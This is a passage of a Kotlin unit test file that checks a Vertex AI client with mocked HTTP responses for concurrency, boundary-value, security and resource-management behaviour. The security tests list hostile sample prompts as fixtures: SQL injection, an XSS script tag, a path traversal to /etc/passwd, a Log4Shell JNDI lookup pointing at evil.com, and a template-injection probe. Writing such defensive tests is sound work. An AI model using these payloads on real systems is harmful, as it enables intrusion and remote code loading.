        coVerify(exactly = prompts.size) {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        }
    }

    @Test
    @DisplayName("Should handle thread interruption gracefully")
    fun `should handle thread interruption gracefully`() = runTest {
        val prompt = "Test prompt"

        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } throws InterruptedException("Thread interrupted")

        assertThrows<InterruptedException> {
            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
        }
    }

    @Test
    @DisplayName("Should handle client state consistency across requests")
    fun `should handle client state consistency across requests`() = runTest {
        val prompt = "Test prompt"
        val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Consistent response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns expectedResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        // Make multiple requests to ensure state consistency
        repeat(3) {
            val result = vertexAIClient.generateContent(prompt, validModel)
            assertEquals("Consistent response", result)
        }

        coVerify(exactly = 3) {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        }
    }
}

@Nested
@DisplayName("Boundary Value Tests")
inner class BoundaryValueTests {

    @Test
    @DisplayName("Should handle single character prompt")
    fun `should handle single character prompt`() = runTest {
        val prompt = "a"
        val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Single char response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns expectedResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(prompt, validModel)
        assertEquals("Single char response", result)
    }

    @Test
    @DisplayName("Should handle maximum theoretical prompt length")
    fun `should handle maximum theoretical prompt length`() = runTest {
        val maxPrompt = "x".repeat(1000000) // 1MB prompt
        val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Max length response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns expectedResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(maxPrompt, validModel)
        assertEquals("Max length response", result)
    }

    @Test
    @DisplayName("Should handle empty JSON response")
    fun `should handle empty JSON response`() = runTest {
        val prompt = "Test prompt"
        val emptyJson = "{}"

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns emptyJson
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(prompt, validModel)
        assertEquals("", result)
    }

    @Test
    @DisplayName("Should handle response with deeply nested JSON")
    fun `should handle response with deeply nested JSON`() = runTest {
        val prompt = "Test prompt"
        val deeplyNestedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Nested response",
                                        "metadata": {
                                            "level1": {
                                                "level2": {
                                                    "level3": {
                                                        "level4": "deep value"
                                                    }
                                                }
                                            }
                                        }
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns deeplyNestedResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        val result = vertexAIClient.generateContent(prompt, validModel)
        assertEquals("Nested response", result)
    }
}

@Nested
@DisplayName("Security and Privacy Tests")
inner class SecurityTests {

    @Test
    @DisplayName("Should not log sensitive information in exceptions")
    fun `should not log sensitive information in exceptions`() = runTest {
        val prompt = "Test prompt"
        val sensitiveApiKey = "secret-api-key-12345"
        val secureClient =
            VertexAIClientImpl(httpClient, sensitiveApiKey, validProjectId, validLocation)

        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } throws RuntimeException("Test exception")

        val exception = assertThrows<RuntimeException> {
            runBlocking { secureClient.generateContent(prompt, validModel) }
        }

        // Verify that sensitive information is not exposed in the exception message
        assertFalse(exception.message?.contains(sensitiveApiKey) == true)
    }

    @Test
    @DisplayName("Should handle API key with special characters")
    fun `should handle API key with special characters`() = runTest {
        val specialApiKey = "key-with-special-chars-!@#$%^&*()"
        val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Special key response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        assertDoesNotThrow {
            val specialClient =
                VertexAIClientImpl(httpClient, specialApiKey, validProjectId, validLocation)

            every { mockResponse.statusCode() } returns 200
            every { mockResponse.body() } returns expectedResponse
            coEvery {
                httpClient.send(
                    any<HttpRequest>(),
                    any<HttpResponse.BodyHandler<String>>()
                )
            } returns mockResponse

            runBlocking { specialClient.generateContent("Test prompt", validModel) }
        }
    }

    @Test
    @DisplayName("Should handle malicious input injection attempts")
    fun `should handle malicious input injection attempts`() = runTest {
        val maliciousPrompts = listOf(
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "\${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "\u0000\u0001\u0002"
        )

        val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Safe response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns expectedResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        maliciousPrompts.forEach { maliciousPrompt ->
            assertDoesNotThrow {
                runBlocking { vertexAIClient.generateContent(maliciousPrompt, validModel) }
            }
        }
    }
}

@Nested
@DisplayName("Resource Management Tests")
inner class ResourceManagementTests {

    @Test
    @DisplayName("Should handle resource cleanup on client disposal")
    fun `should handle resource cleanup on client disposal`() = runTest {
        val prompt = "Test prompt"
        val expectedResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "Cleanup test response"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns expectedResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        // Create a new client instance for cleanup testing
        val disposableClient =
            VertexAIClientImpl(httpClient, validApiKey, validProjectId, validLocation)

        val result = disposableClient.generateContent(prompt, validModel)
        assertEquals("Cleanup test response", result)

        // Verify the client can be used normally
        coVerify { httpClient.send(any<HttpRequest>(), any<HttpResponse.BodyHandler<String>>()) }
    }

    @Test
    @DisplayName("Should handle memory pressure scenarios")
    fun `should handle memory pressure scenarios`() = runTest {
        val prompt = "Test prompt"
        val largeResponse = """
                {
                    "candidates": [
                        {
                            "content": {
                                "parts": [
                                    {
                                        "text": "${"Large response content ".repeat(10000)}"
                                    }
                                ]
                            }
                        }
                    ]
                }
            """.trimIndent()

        every { mockResponse.statusCode() } returns 200
        every { mockResponse.body() } returns largeResponse
        coEvery {
            httpClient.send(
                any<HttpRequest>(),
                any<HttpResponse.BodyHandler<String>>()
            )
        } returns mockResponse

        assertDoesNotThrow {
            runBlocking { vertexAIClient.generateContent(prompt, validModel) }
        }
    }
}
}